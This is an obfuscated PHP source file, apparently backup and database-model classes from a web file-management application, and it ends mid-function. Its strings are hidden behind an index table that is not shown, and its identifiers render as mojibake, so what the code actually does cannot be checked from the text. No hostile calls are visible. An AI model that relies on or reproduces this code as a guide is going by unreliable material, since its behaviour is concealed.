<?php
 goto c¯¤Èí‚¤; eˆ±÷¬ÛÖ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $BÒ¾“âÍŠö =& $_SERVER[Ïº«‚ßèÔˆø]; self::$name = date($BÒ¾“âÍŠö[695]); if (!($böÊ½Ã¹à´ = Model($BÒ¾“âÍŠö[696])->lastItem())) { $böÊ½Ã¹à´ = $this->initData(); } else { self::$name = $böÊ½Ã¹à´[$BÒ¾“âÍŠö[28]]; if ($böÊ½Ã¹à´[$BÒ¾“âÍŠö[697]] == $BÒ¾“âÍŠö[87]) { self::$name = date($BÒ¾“âÍŠö[698]); $A›¹±‘œÑ = 0; if (isset($böÊ½Ã¹à´[$BÒ¾“âÍŠö[290]][$BÒ¾“âÍŠö[192]][$BÒ¾“âÍŠö[445]])) { $A›¹±‘œÑ = (int) $böÊ½Ã¹à´[$BÒ¾“âÍŠö[290]][$BÒ¾“âÍŠö[192]][$BÒ¾“âÍŠö[445]]; } if ($böÊ½Ã¹à´[$BÒ¾“âÍŠö[28]] == self::$name) { Model($BÒ¾“âÍŠö[696])->remove($böÊ½Ã¹à´[$BÒ¾“âÍŠö[392]]); } $böÊ½Ã¹à´ = $this->initData($A›¹±‘œÑ, $böÊ½Ã¹à´[$BÒ¾“âÍŠö[699]]); } else { $this->checkStore($böÊ½Ã¹à´[$BÒ¾“âÍŠö[699]]); } } self::$option = $böÊ½Ã¹à´; } private function initData($BÌÊ–¿’Ö÷ = 0, $bÇÔ¤ÕÖÃ‡ = '') { goto a÷ïÔ†•ÀÓ; AÂê£Óé°à: $a¶Çæ±Šë[$dÓ¨šÛÂ´Ø[392]] = $b†‘»íŒÒÌ; return $a¶Çæ±Šë; goto cõ‘ó÷—õ´; a÷ïÔ†•ÀÓ: $dÓ¨šÛÂ´Ø =& $_SERVER[Ïº«‚ßèÔˆø]; $FÀñÌÅ…í = Model($dÓ¨šÛÂ´Ø[696])->config(); if ($bÇÔ¤ÕÖÃ‡ && $FÀñÌÅ…í[$dÓ¨šÛÂ´Ø[699]] != $bÇÔ¤ÕÖÃ‡) { $BÌÊ–¿’Ö÷ = 0; } goto E¨µùİÂêÈ; E¨µùİÂêÈ: $this->checkStore($FÀñÌÅ…í[$dÓ¨šÛÂ´Ø[699]]); $a¶Çæ±Šë = array($dÓ¨šÛÂ´Ø[699] => $FÀñÌÅ…í[$dÓ¨šÛÂ´Ø[699]], $dÓ¨šÛÂ´Ø[28] => self::$name, $dÓ¨šÛÂ´Ø[697] => 0, $dÓ¨šÛÂ´Ø[700] => $FÀñÌÅ…í[$dÓ¨šÛÂ´Ø[700]], $dÓ¨šÛÂ´Ø[290] => array($dÓ¨šÛÂ´Ø[701] => array($dÓ¨šÛÂ´Ø[697] => 0), $dÓ¨šÛÂ´Ø[702] => array($dÓ¨šÛÂ´Ø[697] => 0, $dÓ¨šÛÂ´Ø[703] => 0, $dÓ¨šÛÂ´Ø[704] => 0, $dÓ¨šÛÂ´Ø[29] => $dÓ¨šÛÂ´Ø[33], $dÓ¨šÛÂ´Ø[705] => 0, $dÓ¨šÛÂ´Ø[474] => 0), $dÓ¨šÛÂ´Ø[706] => array($dÓ¨šÛÂ´Ø[697] => 0, $dÓ¨šÛÂ´Ø[703] => 0, $dÓ¨šÛÂ´Ø[704] => 0, $dÓ¨šÛÂ´Ø[705] => 0, $dÓ¨šÛÂ´Ø[474] => 0), $dÓ¨šÛÂ´Ø[192] => array($dÓ¨šÛÂ´Ø[697] => 0, $dÓ¨šÛÂ´Ø[707] => 0, $dÓ¨šÛÂ´Ø[708] => 0, $dÓ¨šÛÂ´Ø[709] => 0, $dÓ¨šÛÂ´Ø[710] => 0, $dÓ¨šÛÂ´Ø[445] => $BÌÊ–¿’Ö÷, $dÓ¨šÛÂ´Ø[705] => 0, $dÓ¨šÛÂ´Ø[474] => 0)), $dÓ¨šÛÂ´Ø[705] => time(), $dÓ¨šÛÂ´Ø[474] => 0); $b†‘»íŒÒÌ = Model($dÓ¨šÛÂ´Ø[696])->insert($a¶Çæ±Šë); goto AÂê£Óé°à; cõ‘ó÷—õ´: } private function checkStore($dš‡Á‹¤ô) { $dš¸…ëññ‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $A„ñ†ŞÂİ² = Model($dš¸…ëññ‹[711])->listData($dš‡Á‹¤ô); Model($dš¸…ëññ‹[711])->checkConfig($A„ñ†ŞÂİ²); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ïº«‚ßèÔˆø][696])->findByName(self::$name); } return self::$option; } public static function set($c›¤ŠÖ…Š) { $E¡†Û‚°¥´ =& $_SERVER[Ïº«‚ßèÔˆø]; $C—¬ÎŸ¯Ğ¶ = self::get(); foreach ($c›¤ŠÖ…Š as $aÔ™ôÊá => $e³Ô¡ö‡©‚) { $B¨©ëÛì‚Æ = explode($E¡†Û‚°¥´[95], $aÔ™ôÊá); $fÙïïÈ°àÕ = count($B¨©ëÛì‚Æ); switch ($fÙïïÈ°àÕ) { case 1: $C—¬ÎŸ¯Ğ¶[$B¨©ëÛì‚Æ[0]] = $e³Ô¡ö‡©‚; break; case 2: $C—¬ÎŸ¯Ğ¶[$B¨©ëÛì‚Æ[0]][$B¨©ëÛì‚Æ[1]] = $e³Ô¡ö‡©‚; break; case 3: $C—¬ÎŸ¯Ğ¶[$B¨©ëÛì‚Æ[0]][$B¨©ëÛì‚Æ[1]][$B¨©ëÛì‚Æ[2]] = $e³Ô¡ö‡©‚; break; } } Model($E¡†Û‚°¥´[696])->update($C—¬ÎŸ¯Ğ¶[$E¡†Û‚°¥´[392]], $C—¬ÎŸ¯Ğ¶); self::$option = $C—¬ÎŸ¯Ğ¶; return self::$option; } public function keep() { $a­‰ìØÖé² =& $_SERVER[Ïº«‚ßèÔˆø]; $d±‡—›ÅèŒ = self::get(); if ($d±‡—›ÅèŒ[$a­‰ìØÖé²[290]][$a­‰ìØÖé²[701]][$a­‰ìØÖé²[697]] == $a­‰ìØÖé²[87]) { return; } $this->backupKeep($d±‡—›ÅèŒ); self::set(array($a­‰ìØÖé²[712] => 1)); } private function backupKeep($cààŸ•ÖÆ…) { goto FâÃ’ØÕí; FâÃ’ØÕí: $Eîù­Öç¢‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $Cö¸°°ñéË = Model($Eîù­Öç¢‰[696])->listData(); if (empty($Cö¸°°ñéË)) { return; } goto Fó¦²œ¶ª±; bÊÊíÍº¬Û: for ($CŸº¨ãŒ… = 0; $CŸº¨ãŒ… < 12; $CŸº¨ãŒ…++) { $cµä«–™‚‘[] = date($Eîù­Öç¢‰[713], strtotime("\55{$CŸº¨ãŒ…}\40\155\x6f\x6e\x74\150\x73")); } $cµä«–™‚‘ = array_unique($cµä«–™‚‘); $BœîÇÂÇÚ÷ = Model($Eîù­Öç¢‰[714])->get($Eîù­Öç¢‰[715]); goto fÛ‚áŒ¢é™; Fó¦²œ¶ª±: $CŸº¨ãŒ… = 0; $cµä«–™‚‘ = array(); foreach ($Cö¸°°ñéË as $F…ô…á˜øÊ) { if ($CŸº¨ãŒ… >= 7) { break; } $cµä«–™‚‘[] = $F…ô…á˜øÊ[$Eîù­Öç¢‰[28]]; $CŸº¨ãŒ…++; } goto bÊÊíÍº¬Û; fÛ‚áŒ¢é™: foreach ($Cö¸°°ñéË as $F…ô…á˜øÊ) { if (!empty($F…ô…á˜øÊ[$Eîù­Öç¢‰[28]]) && in_array($F…ô…á˜øÊ[$Eîù­Öç¢‰[28]], $cµä«–™‚‘)) { continue; } Model($Eîù­Öç¢‰[696])->remove($F…ô…á˜øÊ[$Eîù­Öç¢‰[392]]); $E™äìàè¤” = $this->backupPath($cààŸ•ÖÆ…, $BœîÇÂÇÚ÷); IO::remove($E™äìàè¤”, !1); } goto E†ºêšÚìñ; E†ºêšÚìñ: } private function backupPath($bØ£óÂ—­, $Bò³»Ú«Áš = false) { $e¸Âòİ¬¶ª =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Bò³»Ú«Áš) { $Bò³»Ú«Áš = Model($e¸Âòİ¬¶ª[714])->get($e¸Âòİ¬¶ª[715]); } $BêîÆ¯Ã´Ò = $bØ£óÂ—­[$e¸Âòİ¬¶ª[28]]; $dœÚ£œ†Ã = substr(md5($e¸Âòİ¬¶ª[716] . $Bò³»Ú«Áš . $BêîÆ¯Ã´Ò), 0, 8); return "\x7b\x69\157\72{$bØ£óÂ—­[$e¸Âòİ¬¶ª[699]]}\x7d\x2f\144\141\x74\141\142\141\x73\145\57\142\x61\143\153\165\160\57" . $BêîÆ¯Ã´Ò . $e¸Âòİ¬¶ª[71] . $dœÚ£œ†Ã; } public function db() { goto EÌ‚²¿ğ¡ˆ; dåÓÉ‰¥ˆó: $bÆèâˆ¯½¼ = new BackupDb(); if (!$bÆèâˆ¯½¼->index()) { return !1; } self::set(array($d×¶˜Ğ¤¶˜[717] => 1)); goto aÒ½Èœ¯í; aÒ½Èœ¯í: return !0; goto F•à¨ã—±ó; EÌ‚²¿ğ¡ˆ: $d×¶˜Ğ¤¶˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $C›Á¢æ÷¶Š = self::get(); if ($C›Á¢æ÷¶Š[$d×¶˜Ğ¤¶˜[290]][$d×¶˜Ğ¤¶˜[702]][$d×¶˜Ğ¤¶˜[697]] == $d×¶˜Ğ¤¶˜[87]) { return !0; } goto dåÓÉ‰¥ˆó; F•à¨ã—±ó: } public function dbFile() { goto dÇğ¶Ñ±Üğ; cÃ±¶‘ÊĞ: $F‹·††‹ïî = new BackupDbFile(); if (!$F‹·††‹ïî->index()) { return !1; } self::set(array($c‹ÃÛ®ãªÔ[718] => 1)); goto B÷‚Ÿë¶•š; B÷‚Ÿë¶•š: return !0; goto fùÍÊÕâ¿Ù; dÇğ¶Ñ±Üğ: $c‹ÃÛ®ãªÔ =& $_SERVER[Ïº«‚ßèÔˆø]; $A³Œ´ß†³ = self::get(); if ($A³Œ´ß†³[$c‹ÃÛ®ãªÔ[290]][$c‹ÃÛ®ãªÔ[706]][$c‹ÃÛ®ãªÔ[697]] == $c‹ÃÛ®ãªÔ[87]) { return !0; } goto cÃ±¶‘ÊĞ; fùÍÊÕâ¿Ù: } public function file() { $BÏùæÖƒ…¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $A£èßÀ¯§Ó = self::get(); if ($A£èßÀ¯§Ó[$BÏùæÖƒ…¢[290]][$BÏùæÖƒ…¢[192]][$BÏùæÖƒ…¢[697]] == $BÏùæÖƒ…¢[87]) { return !0; } if (!isset($A£èßÀ¯§Ó[$BÏùæÖƒ…¢[700]]) || $A£èßÀ¯§Ó[$BÏùæÖƒ…¢[700]] == $BÏùæÖƒ…¢[495]) { $FŠ¤ÌŒ¸¦Ş = new BackupFile(); if (!$FŠ¤ÌŒ¸¦Ş->index()) { return !1; } } self::set(array($BÏùæÖƒ…¢[719] => 1, $BÏùæÖƒ…¢[697] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto A…•ÏÃã•Û; B‰É½ùã¨–: self::$name = $f¼ÖŸ÷ÁŞ[$B¹†“êÔƒ¼[28]]; $bõÊ¶ˆèÈ = $GLOBALS[$B¹†“êÔƒ¼[6]][$B¹†“êÔƒ¼[17]]; $eë›ÀîÅÑ = $this->_dbType($bõÊ¶ˆèÈ); goto Cø–ÕËÁ; FëŠ›ŠùØ»: foreach ($B•Á¸ŸÜ› as $Bˆ¨ÚÁï¥å) { $BÜ•´Ş“¢¢ += $dÅÆ´Ï‹†½->model($Bˆ¨ÚÁï¥å)->count(); } $B«¨ê¹ù§ñ = new Task($B¹†“êÔƒ¼[725], $B¹†“êÔƒ¼[726], $BÜ•´Ş“¢¢, LNG($B¹†“êÔƒ¼[727]) . $B¹†“êÔƒ¼[728] . LNG($B¹†“êÔƒ¼[729])); foreach ($B•Á¸ŸÜ› as $Bˆ¨ÚÁï¥å) { $eíƒáÙ¶ó = $Aò â—ÂÍ . $Bˆ¨ÚÁï¥å . $B¹†“êÔƒ¼[730]; $B¤‚¦Ë½Ö = null; if ($Bˆ¨ÚÁï¥å == $B¹†“êÔƒ¼[731] && (!isset($f¼ÖŸ÷ÁŞ[$B¹†“êÔƒ¼[700]]) || $f¼ÖŸ÷ÁŞ[$B¹†“êÔƒ¼[700]] == $B¹†“êÔƒ¼[495])) { $B¤‚¦Ë½Ö = self::$io; } $eÛ¯åöĞÍê += $dÅÆ´Ï‹†½->sqlFromDb($Bˆ¨ÚÁï¥å, $eíƒáÙ¶ó, $B«¨ê¹ù§ñ, $B¤‚¦Ë½Ö); } goto DÖó×ç×ª; EÓ¤Íˆî¸¨: $Aò â—ÂÍ = $this->tmpFilesPath() . $B¹†“êÔƒ¼[722] . self::$name . $B¹†“êÔƒ¼[8]; del_dir($Aò â—ÂÍ); mk_dir($Aò â—ÂÍ); goto AÉ²ğ–ë’; A…•ÏÃã•Û: $B¹†“êÔƒ¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $f¼ÖŸ÷ÁŞ = Backup::get(); self::$io = $f¼ÖŸ÷ÁŞ[$B¹†“êÔƒ¼[699]]; goto B‰É½ùã¨–; fğ¾¶­áÈè: Backup::set($Bİ„ÅÍ­ï); if ($BÜ•´Ş“¢¢ > $eÛ¯åöĞÍê) { write_log(array($B¹†“êÔƒ¼[737], $Bİ„ÅÍ­ï), $B¹†“êÔƒ¼[726]); return !1; } return !0; goto b„Î¸äÓ©; Cø–ÕËÁ: $dÅÆ´Ï‹†½ = new DbManage($bõÊ¶ˆèÈ, $eë›ÀîÅÑ); $Bİ„ÅÍ­ï = array($B¹†“êÔƒ¼[720] => $eë›ÀîÅÑ, $B¹†“êÔƒ¼[721] => time()); Backup::set($Bİ„ÅÍ­ï); goto EÓ¤Íˆî¸¨; DÖó×ç×ª: if (isset($B«¨ê¹ù§ñ->task[$B¹†“êÔƒ¼[732]])) { $D…öÓˆ¬ = $B«¨ê¹ù§ñ->task[$B¹†“êÔƒ¼[732]] ? $B«¨ê¹ù§ñ->task[$B¹†“êÔƒ¼[732]] : timeFloat(); $Fö¬—Ğ„º = $D…öÓˆ¬ - $B«¨ê¹ù§ñ->task[$B¹†“êÔƒ¼[733]]; if ($Fö¬—Ğ„º >= 0.2) { $BÜ•´Ş“¢¢ += 1; } } $B«¨ê¹ù§ñ->end(); $Bİ„ÅÍ­ï = array($B¹†“êÔƒ¼[720] => $eë›ÀîÅÑ, $B¹†“êÔƒ¼[717] => 1, $B¹†“êÔƒ¼[734] => $BÜ•´Ş“¢¢, $B¹†“êÔƒ¼[735] => $eÛ¯åöĞÍê, $B¹†“êÔƒ¼[736] => time()); goto fğ¾¶­áÈè; AÉ²ğ–ë’: $BÜ•´Ş“¢¢ = $eÛ¯åöĞÍê = 0; try { $B•Á¸ŸÜ› = $dÅÆ´Ï‹†½->db()->getTables(); } catch (Exception $F’õÍÊĞŒ´) { return !1; } $B•Á¸ŸÜ› = array_diff($B•Á¸ŸÜ›, array($B¹†“êÔƒ¼[723], $B¹†“êÔƒ¼[724])); goto FëŠ›ŠùØ»; b„Î¸äÓ©: } private function _dbType($cà³¨‚‚µ) { goto a½°©Ÿ‰„è; F‡ÊÍÁ±²: if ($Eâ„ù°ŸùŠ == $B×´ôİ¢±´[739]) { $CÎ¬—ŠŞ¶À = explode($B×´ôİ¢±´[4], $cà³¨‚‚µ[$B×´ôİ¢±´[740]]); $Eâ„ù°ŸùŠ = $CÎ¬—ŠŞ¶À[0]; } $e ­Ğôˆº¾ = array($B×´ôİ¢±´[741] => $B×´ôİ¢±´[9], $B×´ôİ¢±´[742] => $B×´ôİ¢±´[743]); if (isset($e ­Ğôˆº¾[$Eâ„ù°ŸùŠ])) { $Eâ„ù°ŸùŠ = $e ­Ğôˆº¾[$Eâ„ù°ŸùŠ]; } goto f µïŒÌİ¿; f µïŒÌİ¿: return $Eâ„ù°ŸùŠ; goto B¼ˆ•Ÿò÷; a½°©Ÿ‰„è: $B×´ôİ¢±´ =& $_SERVER[Ïº«‚ßèÔˆø]; $cà³¨‚‚µ = array_change_key_case($cà³¨‚‚µ); $Eâ„ù°ŸùŠ = $cà³¨‚‚µ[$B×´ôİ¢±´[738]]; goto F‡ÊÍÁ±²; B¼ˆ•Ÿò÷: } private function tmpFilesPath() { $a˜ÇĞˆò´” =& $_SERVER[Ïº«‚ßèÔˆø]; $B‘ÍÑ¤Ç„ = TEMP_FILES; if ($GLOBALS[$a˜ÇĞˆò´”[6]][$a˜ÇĞˆò´”[88]][$a˜ÇĞˆò´”[744]]) { $B‘ÍÑ¤Ç„ = $GLOBALS[$a˜ÇĞˆò´”[6]][$a˜ÇĞˆò´”[88]][$a˜ÇĞˆò´”[744]]; if (!mk_dir($B‘ÍÑ¤Ç„) || !is_writable($B‘ÍÑ¤Ç„) || !IO::mkfile($B‘ÍÑ¤Ç„ . $a˜ÇĞˆò´”[745])) { $B‘ÍÑ¤Ç„ = TEMP_FILES; } } return $B‘ÍÑ¤Ç„; } } $E°óæÃì˜µ = $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][746]]; goto fˆ²¥×©ø; dÓ‰õö”Ü: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\124\151\155\145", "\164\x69\155\145", "\151\x6e\163\x65\x72\164\54\x75\x70\x64\x61\x74\x65", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\143\162\145\x61\164\x65\124\x69\155\145", "\164\151\x6d\145", "\151\156\x73\145\162\164", "\146\165\x6e\143\x74\x69\157\x6e")); public function setDataAuto($Féğöƒ°àİ) { $this->dataAuto = $Féğöƒ°àİ; } public function __construct($dÑåø¥•œÅ = '', $E†ÆìÃÇ¥ = '', $fÏŠŸÆŒ = '') { parent::__construct($dÑåø¥•œÅ, $E†ÆìÃÇ¥, $fÏŠŸÆŒ); } public static function textEncode($b½ãÀ½¼•ƒ) { if (!$b½ãÀ½¼•ƒ) { return $b½ãÀ½¼•ƒ; } $d¾•›‰„ãà = json_encode($b½ãÀ½¼•ƒ); $d¾•›‰„ãà = preg_replace_callback($_SERVER[Ïº«‚ßèÔˆø][352], function ($DĞ•ÕîÅ¯İ) { return addslashes($DĞ•ÕîÅ¯İ[0]); }, $d¾•›‰„ãà); return json_decode($d¾•›‰„ãà); } public static function textDecode($dŞÆªø¾È) { $có¯İùŠï” =& $_SERVER[Ïº«‚ßèÔˆø]; $DÇ¼áäˆª = json_encode($dŞÆªø¾È); $DÇ¼áäˆª = preg_replace_callback($có¯İùŠï”[353], function ($BØÊ–½˜–ˆ) { return $_SERVER[Ïº«‚ßèÔˆø][97]; }, $DÇ¼áäˆª); return json_decode($DÇ¼áäˆª); } protected $tableMeta = array(); protected function _beforeInsert(&$a½¾Ä¢â©¨, $C»­Šƒ¤Ğ­) { $b«ôÏèÃæ½ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->checkDataAutoHas($b«ôÏèÃæ½[354])) { return; } $this->dataBeforeFilter($a½¾Ä¢â©¨, $b«ôÏèÃæ½[354]); } protected function _beforeUpdate(&$FÄ˜åÃ®Ë, $CËÑŞ’³‹Å) { $Aç§ÎËé„ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->checkDataAutoHas($Aç§ÎËé„[355])) { return; } $this->dataBeforeFilter($FÄ˜åÃ®Ë, $Aç§ÎËé„[355]); } protected function _afterSelect(&$d‘ÖÃé‰¢‡, $dî¦á‚°à) { if (!is_array($d‘ÖÃé‰¢‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ïº«‚ßèÔˆø][356])) { return; } foreach ($d‘ÖÃé‰¢‡ as &$b°¦õÑ¨Ô) { $this->dataAfterFilter($b°¦õÑ¨Ô); } unset($b°¦õÑ¨Ô); } protected function _afterFind(&$f‹ó®à›«¨, $bÑõˆ˜ñßí) { if (!is_array($f‹ó®à›«¨)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ïº«‚ßèÔˆø][356])) { return; } $this->dataAfterFilter($f‹ó®à›«¨); } public function setAutoIncrement($eĞ‹öô¹œ¡) { $DÕÃ®¦ÁÛ = array($this->getPk() => $eĞ‹öô¹œ¡); $FÏ¤ßÁÇ× = $this->data($DÕÃ®¦ÁÛ)->add(); if ($FÏ¤ßÁÇ×) { $this->delete($FÏ¤ßÁÇ×); } } public function getAutoIncrement() { $eŞÏœÂ–ˆ = $this->getTableName(); $eÑ³¥¥Ò¦Ü = $this->max($this->getPk()); $eİˆœ©øø© = $this->query("\x73\x68\x6f\x77\x20\x74\141\x62\154\145\x20\x73\x74\x61\x74\165\163\40\167\150\145\x72\145\40\x4e\x61\155\145\x3d\x27{$eŞÏœÂ–ˆ}\47"); $Aî·ŒÏ¯õ­ = $eİˆœ©øø©[0][$_SERVER[Ïº«‚ßèÔˆø][357]]; $c‡ƒäÛ˜™Û = max($eÑ³¥¥Ò¦Ü, $Aî·ŒÏ¯õ­); return $c‡ƒäÛ˜™Û; } protected function _callBefore($eå®×²ƒ, $A–²–¬•†”) { return $this->cacheCallCheck($eå®×²ƒ, $A–²–¬•†”, !1); } protected function _callAfter($CçÁ‚ùËÏŒ, $fÎù ¥Õ´ô) { return $this->cacheCallCheck($CçÁ‚ùËÏŒ, $fÎù ¥Õ´ô, !0); } protected function cacheFunctionAlias($DÍ†¢Ù†±î) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d¡–…øÁ÷ß, $FÉŸè×Ç¦æ, $aĞ‡’ïê„Ï = false) { $eª‡äá£Ú£ = $this->cacheFunctionAlias($FÉŸè×Ç¦æ); if (!$eª‡äá£Ú£) { return; } foreach ($eª‡äá£Ú£ as $dœ÷à®ÈÒÊ => $Cõ›ÑßÃ¯ß) { $Fø¤Æšì¥ = $Cõ›ÑßÃ¯ß[0]; $Dó§ËÊ³ØÙ = explode($_SERVER[Ïº«‚ßèÔˆø][47], $Cõ›ÑßÃ¯ß[1]); if ($d¡–…øÁ÷ß == $dœ÷à®ÈÒÊ) { return $this->cacheFunctionGet($dœ÷à®ÈÒÊ, $Fø¤Æšì¥); } if ($aĞ‡’ïê„Ï && in_array($d¡–…øÁ÷ß, $Dó§ËÊ³ØÙ)) { $this->cacheFunctionClear($dœ÷à®ÈÒÊ, $Fø¤Æšì¥); } } } public function cacheFunctionGet($Eò‰òÀ¶ğ–, $aÑ¨¦“İù§) { $E÷Ñ…ÙËÕ¼ = $this->cacheKeyMake($Eò‰òÀ¶ğ–, $aÑ¨¦“İù§); $CÌµŠìä„ = Cache::get($E÷Ñ…ÙËÕ¼); if (!is_array($CÌµŠìä„)) { $CÌµŠìä„ = call_user_func_array(array($this, $Eò‰òÀ¶ğ–), array($aÑ¨¦“İù§, !0)); Cache::set($E÷Ñ…ÙËÕ¼, $CÌµŠìä„); } return $CÌµŠìä„; } public function cacheFunctionClear($C‚Üã›Ÿéæ, $BŒ´ƒ©ÍÔƒ) { $BÈ†Î¯Í³• = $BŒ´ƒ©ÍÔƒ; if (!is_array($BŒ´ƒ©ÍÔƒ)) { $BÈ†Î¯Í³• = array($BŒ´ƒ©ÍÔƒ); } foreach ($BÈ†Î¯Í³• as $Bãä½°›¤«) { $DÂ±…ÜËÖ = $this->cacheKeyMake($C‚Üã›Ÿéæ, $Bãä½°›¤«); Cache::remove($DÂ±…ÜËÖ); } } private function cacheKeyMake($DÛš‚‰æì¤, $b”õÊ½±…×) { $fŒŒì¦òƒ¦ =& $_SERVER[Ïº«‚ßèÔˆø]; return get_class($this) . $fŒŒì¦òƒ¦[71] . $DÛš‚‰æì¤ . $fŒŒì¦òƒ¦[358] . $b”õÊ½±…×; } protected function selectPageReset() { $cåÕãÀ…‘Ù =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($GLOBALS[$cåÕãÀ…‘Ù[359]])) { return; } $GLOBALS[$cåÕãÀ…‘Ù[359]] = isset($GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[360]]) ? $GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[360]] : !1; $GLOBALS[$cåÕãÀ…‘Ù[361]] = isset($GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[350]]) ? $GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[350]] : !1; $GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[360]] = !1; $GLOBALS[$cåÕãÀ…‘Ù[7]][$cåÕãÀ…‘Ù[350]] = !1; } protected function selectPageRestore() { $eòÕŠ‘¼Ã‰ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($GLOBALS[$eòÕŠ‘¼Ã‰[359]])) { return; } $GLOBALS[$eòÕŠ‘¼Ã‰[7]][$eòÕŠ‘¼Ã‰[360]] = $GLOBALS[$eòÕŠ‘¼Ã‰[359]]; $GLOBALS[$eòÕŠ‘¼Ã‰[7]][$eòÕŠ‘¼Ã‰[350]] = $GLOBALS[$eòÕŠ‘¼Ã‰[361]]; unset($GLOBALS[$eòÕŠ‘¼Ã‰[359]]); unset($GLOBALS[$eòÕŠ‘¼Ã‰[361]]); } protected function selectPage($E¡…ãø–Á = 200, $bÂ©‰èé¤ì = 1) { goto eõ¦Ä¼Ÿ¾ ; A—·½ÖÓØä: $F‡Æ‡Ïòºø = array(); $bï£›°»•ß = 1; if ($bÂ©‰èé¤ì == 1 && $bï£›°»•ß) { $this->optionsValue($f¹Õã·¡Ğ); $F‡Æ‡Ïòºø = $this->page($bÂ©‰èé¤ì, $E¡…ãø–Á)->select(); $Bïôù÷š = is_array($F‡Æ‡Ïòºø) ? count($F‡Æ‡Ïòºø) : 0; if ($Bïôù÷š < $E¡…ãø–Á) { $Cºïãğø” = 1; } else { $this->optionsValue($d½çáñ½); $Bïôù÷š = intval($this->count()); $Cºïãğø” = ceil($Bïôù÷š / $E¡…ãø–Á); } } else { $this->optionsValue($d½çáñ½); $Bïôù÷š = intval($this->count()); $Cºïãğø” = ceil($Bïôù÷š / $E¡…ãø–Á); $bÂ©‰èé¤ì = $bÂ©‰èé¤ì >= $Cºïãğø” ? $Cºïãğø” : $bÂ©‰èé¤ì; $this->optionsValue($f¹Õã·¡Ğ); $F‡Æ‡Ïòºø = $this->page($bÂ©‰èé¤ì, $E¡…ãø–Á)->select(); } goto e½âİ£—‹¯; cÜ·Ì•öòñ: $d½çáñ½ = $f¹Õã·¡Ğ; $d½çáñ½[$Bº¯ƒ½ø×¬[362]] = array(); $E¡…ãø–Á = intval($E¡…ãø–Á); goto fáÀãß©‡Ê; e½âİ£—‹¯: if (!is_array($F‡Æ‡Ïòºø)) { $F‡Æ‡Ïòºø = array(); } if ($Cºïãğø” == 1) { $Bïôù÷š = count($F‡Æ‡Ïòºø); } $bùê¯¿Á§Ï = array($Bº¯ƒ½ø×¬[363] => array($Bº¯ƒ½ø×¬[364] => $Bïôù÷š, $Bº¯ƒ½ø×¬[360] => $E¡…ãø–Á, $Bº¯ƒ½ø×¬[350] => $bÂ©‰èé¤ì, $Bº¯ƒ½ø×¬[365] => $Cºïãğø”), $Bº¯ƒ½ø×¬[366] => $F‡Æ‡Ïòºø); goto CÚñ ŠèÖ; d •Â¤‚šÉ: $A²¥Œ îŒ‘ = 50000; $E¡…ãø–Á = isset($in[$Bº¯ƒ½ø×¬[360]]) && $in[$Bº¯ƒ½ø×¬[360]] ? $in[$Bº¯ƒ½ø×¬[360]] : $E¡…ãø–Á; if ($E¡…ãø–Á === -1) { $in[$Bº¯ƒ½ø×¬[360]] = !1; $A²¥Œ îŒ‘ = 100000000; $E¡…ãø–Á = $A²¥Œ îŒ‘; } goto cÜ·Ì•öòñ; CÚñ ŠèÖ: return $bùê¯¿Á§Ï; goto F©ÜÉ¤êîç; eõ¦Ä¼Ÿ¾ : $Bº¯ƒ½ø×¬ =& $_SERVER[Ïº«‚ßèÔˆø]; global $in; $f¹Õã·¡Ğ = $this->optionsValue(); goto d •Â¤‚šÉ; fáÀãß©‡Ê: $E¡…ãø–Á = $E¡…ãø–Á <= 5 ? 5 : ($E¡…ãø–Á >= $A²¥Œ îŒ‘ ? $A²¥Œ îŒ‘ : $E¡…ãø–Á); $bÂ©‰èé¤ì = intval(isset($in[$Bº¯ƒ½ø×¬[350]]) && $in[$Bº¯ƒ½ø×¬[350]] ? $in[$Bº¯ƒ½ø×¬[350]] : $bÂ©‰èé¤ì); $bÂ©‰èé¤ì = $bÂ©‰èé¤ì <= 1 ? 1 : $bÂ©‰èé¤ì; goto A—·½ÖÓØä; F©ÜÉ¤êîç: } protected function checkLength($b…é¤‘º‡­, $EËã³•ï = 0, $A«øç’ªŠæ = '') { $FäåŸÅÁ–° =& $_SERVER[Ïº«‚ßèÔˆø]; $EËã³•ï = $EËã³•ï ? $EËã³•ï : 65536; if (!$b…é¤‘º‡­ || strlen($b…é¤‘º‡­) < $EËã³•ï) { return; } $A«øç’ªŠæ = $A«øç’ªŠæ ? $A«øç’ªŠæ . $FäåŸÅÁ–°[68] : $FäåŸÅÁ–°[33]; show_json($A«øç’ªŠæ . LNG($FäåŸÅÁ–°[367]) . "\50{$EËã³•ï}\51", !1); } protected function metaSet($C…–¢æµ¤…, $C¹ª§ÂŸó = null, $aìö‚ÙÙŠ = null) { goto CÀ´Àëò; E–Ÿù¬à: $F‹Íš§ˆ = $C¾˜ß±ÏË[372] . $this->tableMeta; CacheLock::lock($F‹Íš§ˆ); $f¿Åï„Ê¨->where(array($cĞñ¼‘§à => $C…–¢æµ¤…))->addAll($c‚“ìÕœÊ, array(), !0); goto aø†·øòñÙ; a¶îÕâ¿„¯: if (is_null($C¹ª§ÂŸó)) { return 